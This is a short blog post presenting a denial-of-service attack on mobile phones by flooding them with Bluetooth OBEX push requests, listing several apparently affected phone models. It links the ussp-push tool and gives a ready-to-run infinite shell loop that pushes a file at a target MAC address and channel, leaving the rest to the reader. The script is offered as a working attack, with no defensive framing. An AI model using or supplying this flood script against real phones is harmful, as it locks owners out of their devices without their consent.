--- 
layout: post
title: Bluetooth Obex DoS
created: 1169590169
---
DoS your mobile phone with lots of Obex pushes. It would seem that most mobiles force you to either accept or deny the push, this disables any other usage of the phone including the ability to turn off bluetooth.
 
This has apparently been confirmed on the following phones:
<ul>
<li>Sony Ericsson K700i</li>
<li>Nokia N70</li>
<li>Motorola MOTORAZR V3</li>
<li>Sony Ericsson W810i</li>
<li>LG Chocolate KG800</li>
</ul>

No doubt many other phones are effected.

Attached is the current release of the [ussp-push](http://www.xmailserver.org/ussp-push.html) program which uses the [Bluez](http://www.bluez.org/) bluetooth stack to do a Obex push.

All that is required is a wrapper script of the form:
<pre>
while true
do
        ./ussp-push $MAC@$OCHAN $FILENAME $FILENAME
done
</pre>

You can work the rest out yourself...
